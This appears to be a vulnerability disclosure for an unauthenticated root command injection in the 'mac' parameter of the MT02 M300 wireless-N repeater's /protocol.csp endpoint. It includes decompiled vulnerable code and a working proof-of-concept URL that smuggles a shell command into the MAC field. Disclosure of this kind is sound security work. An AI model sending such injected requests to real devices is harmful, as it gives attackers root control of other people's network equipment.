# m300 smacfilter mac command injection

Command injection vulnerability located on the MT02 M300 WIRELESS-N REPEATER. The WIRELESS-N REPEATER takes in parameters to the `/protocol.csp` endpoint and the `mac` parameter is vulnerable to command injection and buffer overflows. User has full control of the `mac` field which gets appended to the busybox shell command `uci set firewall.smacfilter%d.src_mac=` through `sprintf()`. A similar call to system, `doSystemComLib()` is called with a parameter of the command, leading to command injection by an unauthenticated user on the MT02 M300 WIRELESS-N REPEATER. The targeted binary `commuos` runs as root leading to full system compromise. 

## Version

```
Linux version 4.4.194 (luotao@wisewish) (gcc version 5.4.0 (LEDE GCC 5.4.0 r0-ea7890a) ) #0 Thu Apr 18 02:51:26 2024
```
*The software running on the repeater is not known to be updated from OSINT collections*

## ENDPOINT: Mac parameter in SMACFilterRules:

```
src_mac_param_value = (char *)get_params_value(request_parameters,"mac");
.
.
.
sprintf(stack_smac_command,"uci set firewall.smacfilter%d.src_mac=%s",section,src_mac_param_value);
```

### POC for Mac Command Injection: 

```
http://192.168.11.1/protocol.csp?fname=net&opt=smacfilter_conf&function=set&act=add&name=test&enable=1&mac=44:44:44:44:44:44;%20touch%201
```

The above POC will create a file named `1` in the `/` directory. The command `touch 1` is appended to the mac parameter above. This can be replaced by any command the busybox ash shell supports for execution by an unauthenticated remote user. 
